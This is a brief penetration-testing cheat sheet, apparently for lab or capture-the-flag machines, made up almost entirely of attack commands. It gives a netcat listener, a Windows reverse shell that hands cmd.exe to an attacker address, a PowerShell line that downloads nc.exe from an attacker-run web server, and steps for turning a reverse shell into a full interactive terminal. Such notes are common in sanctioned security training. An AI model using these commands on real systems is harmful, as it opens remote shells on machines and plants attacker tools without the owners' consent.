# Cheatsheet

Listen locally with nc
```
nc -lvnp 4444
```

Remote (Windows):
```
nc.exe -e cmd.exe <local ip> 4444
```

Python web server and download with PS

```
python3 -m http.server 80
powershell Invoke-Webrequest -OutFile C:\temp\nc.exe -Uri http://10.10.14.116/nc.exe"
```

## Interactive terminal

Using Python for a psuedo terminal

```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```